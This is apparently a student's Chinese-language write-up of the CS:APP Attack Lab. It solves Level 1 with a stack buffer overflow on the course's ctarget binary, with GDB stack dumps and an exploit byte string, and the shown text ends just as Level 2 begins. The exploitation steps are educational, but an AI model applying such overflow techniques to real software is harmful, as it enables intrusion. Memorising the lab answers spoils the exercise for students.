### 实验3 攻击实验
***
## Level 1
通过阅读README.md文件，了解我们的任务，`test()`函数中调用了`getbuf()`函数，我们希望在执行完`getbuf()`函数后不要返回`test()`函数，而是返回到`touch1()`函数。

`unix> objdump -d ctarget > ctarget.s`命令可以将`ctarget`文件反汇编成汇编代码。

先找到`touch1()`的函数地址，`00000000004017c0`     

调用`hex2raw`将把文本形式的十六进制字符串，转换成真正的二进制原始字节流。   
`unix> ./hex2raw < exploit.txt > exploit-raw.txt`
 
这样就可以在GDB调试中，将原始字符串存储在一个文件中，并以命令行参数的形式提供文件名
```
unix> gdb ctarget
(gdb) run -q < exploit-raw.txt (-q是为了关闭notify)
```
我们使用GDB调速器，在调用`getbuf()`函数中的`Gets()`设置一个断点，查看输入字符串后栈的情况。
```
(gdb) x/16gx $rsp
0x5561dc78:     0x4241353433323130      0x0000000000004443
0x5561dc88:     0x0000000000000000      0x0000000000000000
0x5561dc98:     0x0000000055586000      0x0000000000401976
0x5561dca8:     0x0000000000000009      0x0000000000401f24
0x5561dcb8:     0x0000000000000000      0xf4f4f4f4f4f4f4f4
0x5561dcc8:     0xf4f4f4f4f4f4f4f4      0xf4f4f4f4f4f4f4f4
0x5561dcd8:     0xf4f4f4f4f4f4f4f4      0xf4f4f4f4f4f4f4f4
0x5561dce8:     0xf4f4f4f4f4f4f4f4      0xf4f4f4f4f4f4f4f4
```
可以看到0x5561dca0地址处的值就是返回地址，我们只要通过字符串输入溢出用touch1()函数的地址覆盖掉这个返回地址，就可以实现攻击了。
 
我们修改一下exploit.txt文件
```
30 31 32 33 34 35 41 42 30 31 32 33 34 35 41 42 30 31 32 33 34 35 41 42 30 31 32 33 34 35 41 42 30 31 32 33 34 35 41 42 00 00 00 00 00 40 17 c0
```
尝试运行
```
Starting program: /home/emilia/emilia/csapplab/attacklab/target1/ctarget -q < exploit-raw.txt
Cookie: 0x59b997fa

Program received signal SIGSEGV, Segmentation fault.
0x00000000004017bd in getbuf () at buf.c:16
16      in buf.c
(gdb) continue
Continuing.
Type string:Ouch!: You caused a segmentation fault!
Better luck next time
FAIL: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:FAIL:0xffffffff:ctarget:0:30 31 32 33 34 35 41 42 30 31 32 33 34 35 41 42 30 31 32 33 34 35 41 42 30 31 32 33 34 35 41 42 30 31 32 33 34 35 41 42 00 00 00 00 00 40 17 C0 
[Inferior 1 (process 5721) exited with code 01]
```
发生了报错，我们重新打一下调点看看修改输入文件后栈的值是否和我们期望中的一样。
```
(gdb) x/16gx $rsp
0x5561dc78:     0x4241353433323130      0x4241353433323130
0x5561dc88:     0x4241353433323130      0x4241353433323130
0x5561dc98:     0x4241353433323130      0xc017400000000000
0x5561dca8:     0x0000000000000000      0x0000000000401f24
0x5561dcb8:     0x0000000000000000      0xf4f4f4f4f4f4f4f4
0x5561dcc8:     0xf4f4f4f4f4f4f4f4      0xf4f4f4f4f4f4f4f4
0x5561dcd8:     0xf4f4f4f4f4f4f4f4      0xf4f4f4f4f4f4f4f4
0x5561dce8:     0xf4f4f4f4f4f4f4f4      0xf4f4f4f4f4f4f4f4
```
发现我们输入的返回地址反了😄(Linux是小端法，即低位字节放在地址小的地方)，我们重新修改一下输入文件的值再次尝试。
```
30 31 32 33 34 35 41 42 30 31 32 33 34 35 41 42 30 31 32 33 34 35 41 42 30 31 32 33 34 35 41 42 30 31 32 33 34 35 41 42 c0 17 40 00 00 00 00 00
```
```
(gdb) run -q < exploit-raw.txt
Starting program: /home/emilia/emilia/csapplab/attacklab/target1/ctarget -q < exploit-raw.txt
Cookie: 0x59b997fa
Type string:Touch1!: You called touch1()
Valid solution for level 1 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:1:30 31 32 33 34 35 41 42 30 31 32 33 34 35 41 42 30 31 32 33 34 35 41 42 30 31 32 33 34 35 41 42 30 31 32 33 34 35 41 42 C0 17 40 00 00 00 00 00 
[Inferior 1 (process 8439) exited normally]
```
可以看到我们成功调用了`touch1()`函数，完成了攻击实验的第一级。

## Level2

阅读一下README文件，查看一下我们的目标，我们需要返回到`touch2()`函数，并且设置好cookie的值。我们查看`touch2()`函数的地址,修改我们的exploit.txt文件。
`00000000004017ec`
